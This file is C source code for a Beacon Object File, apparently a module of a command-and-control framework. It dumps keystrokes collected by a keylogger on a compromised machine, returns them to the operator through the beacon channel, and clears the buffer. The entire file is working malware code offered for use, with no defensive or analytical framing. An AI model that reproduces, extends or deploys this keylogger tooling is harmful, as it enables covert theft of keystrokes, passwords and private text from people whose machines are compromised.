/// keylog_dump.c — Dump captured keystrokes (thread-safe, non-blocking)
/// gcc -c -o keylog_dump.o keylog_dump.c -include bof_api.h -Os -fPIC
#include "bof_api.h"

static int kl_trylock(int *lk) { return __sync_lock_test_and_set(lk, 1) == 0; }
static void kl_unlock(int *lk) { __sync_lock_release(lk); }

void go(char *args, int args_len) {
    char *buf       = (char *)AxGetGlobal("kl_buf");
    int  *pos       = (int  *)AxGetGlobal("kl_pos");
    int  *lock      = (int  *)AxGetGlobal("kl_lock");
    char *pend_buf  = (char *)AxGetGlobal("kl_pending_buf");
    long  pend_len  = (long)  AxGetGlobal("kl_pending_len");
    long  rotations = (long)  AxGetGlobal("kl_rotations");

    if (!buf || !pos || !lock) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Keylogger not running\n");
        return;
    }

    if (!kl_trylock(lock)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Keylogger busy, try again\n");
        return;
    }

    int active_len = *pos;
    int total = (pend_buf ? (int)pend_len : 0) + active_len;

    if (total <= 0) {
        kl_unlock(lock);
        BeaconPrintf(CALLBACK_OUTPUT, "[-] No keystrokes captured yet\n");
        return;
    }

    /* Save last byte BEFORE freeing anything */
    char last = 0;
    if (active_len > 0)
        last = buf[active_len - 1];
    else if (pend_buf && pend_len > 0)
        last = pend_buf[pend_len - 1];

    BeaconPrintf(CALLBACK_OUTPUT, "\n\xe2\x94\x8c\xe2\x94\x80 Keylog Dump (%d bytes, %ld rotations)\n\xe2\x94\x82\n",
                 total, rotations);

    /* Output + free pending buffer */
    if (pend_buf && pend_len > 0) {
        BeaconOutput(CALLBACK_OUTPUT, pend_buf, (int)pend_len);
        AxFree(pend_buf);
        AxSetGlobal("kl_pending_buf", (void *)0);
        AxSetGlobal("kl_pending_len", (void *)0);
    }

    /* Output + reset active buffer */
    if (active_len > 0) {
        BeaconOutput(CALLBACK_OUTPUT, buf, active_len);
        *pos = 0;
    }

    kl_unlock(lock);

    /* Newline check uses saved 'last', no dangling pointer */
    if (last && last != '\n')
        BeaconOutput(CALLBACK_OUTPUT, "\n", 1);

    BeaconPrintf(CALLBACK_OUTPUT, "\xe2\x94\x82\n\xe2\x94\x94\xe2\x94\x80 Buffer cleared\n\n");
}
